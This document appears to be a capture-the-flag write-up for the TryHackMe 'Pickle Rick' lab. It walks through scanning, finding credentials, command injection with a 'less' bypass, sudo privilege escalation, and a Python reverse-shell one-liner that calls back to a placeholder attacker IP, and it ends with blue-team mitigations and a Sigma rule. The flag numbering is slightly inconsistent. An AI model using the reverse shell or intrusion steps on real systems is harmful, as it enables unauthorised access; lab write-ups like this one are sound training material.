# Attack Simulation: Pickle Rick

## 1. Initial Scanning

```bash
nmap -sV -sC -Pn 10.112.186.221
```

Open ports:
- 22/tcp (SSH)
- 80/tcp (HTTP)

Screenshot: nmap scan results

## 2. Web Reconnaissance

Visited http://10.112.186.221 – Rick & Morty theme.

View page source – found username in HTML comment:
```html
<!-- Username: R1ckRul3s -->
```

Screenshot: page source with username

Robots.txt gave password:
```bash
curl http://10.112.186.221/robots.txt
# Output: Wubbalubbadubdub
```

Screenshot: robots.txt password

Directory brute force (gobuster):
```bash
gobuster dir -u http://10.112.186.221 -w /usr/share/wordlists/dirb/common.txt
```

Discovered `/login.php` and `/assets`.

Screenshot: gobuster directory brute force

## 3. Login & Command Injection

Visited `/login.php` – used credentials:
- Username: R1ckRul3s
- Password: Wubbalubbadubdub

Screenshot: login panel

The command panel allowed system commands.

First attempt `cat` – blocked.

Screenshot: cat command disabled

Bypass using `less`:
```bash
less Sup3rS3cretPickl3Ingred.txt
```

Got first flag.

Screenshot: less command working  
Screenshot: first flag captured

## 4. Privilege Escalation

Checked sudo rights:
```bash
sudo -l
# Output: (ALL) NOPASSWD: ALL – can run any command as root without password
```

Screenshot: sudo privileges

Second flag (inside `/root`):
```bash
sudo ls /root
# Saw 2nd.txt
sudo cat /root/2nd.txt
# If cat blocked, use: sudo less /root/2nd.txt
```

Screenshot: second flag

Third flag (inside `/home/rick` – note space in filename):
```bash
sudo ls /home/rick
# Saw: second ingredients
sudo cat "/home/rick/second ingredients"
```

Screenshot: third flag (final)

## 5. Reverse Shell (Optional Full Control)

Started listener:
```bash
nc -lvnp 4444
```

Python one-liner in command panel (replace `<your_IP>`):
```python
sudo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Got root shell.

## Detection & Mitigation (Blue Team)

| Attack Step | Detection Method | Mitigation |
|-------------|------------------|------------|
| Command injection | WAF rules on `|`, `;`, `$()`, `python -c` | Input validation, allowlist commands |
| `cat` bypass with `less` | Monitor process execution (Sysmon Event ID 1) | Restrict available binaries in web shell |
| `sudo NOPASSWD: ALL` | Audit logs: `/var/log/auth.log` | Never use NOPASSWD; restrict to specific commands |
| Reverse shell | Network egress filtering on high ports; Sysmon network events | Block outbound ports (except needed) |

### Sigma Rule Example (Reverse Shell)

```yaml
title: Suspicious Python Reverse Shell
status: experimental
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith: '/python3'
        CommandLine|contains: 'socket.socket'
    condition: selection
```

## Flags (Spoilers Hidden)

<details>
<summary>Click to reveal</summary>

- Flag 1: `flag{first_ingredient}` (actual value varies per instance)
- Flag 2: `flag{root_flag}`
- Flag 3: `flag{third_rick_flag}`

</details>

## References

- TryHackMe Pickle Rick
- GTFOBins – less
- Linux Privilege Escalation – sudo
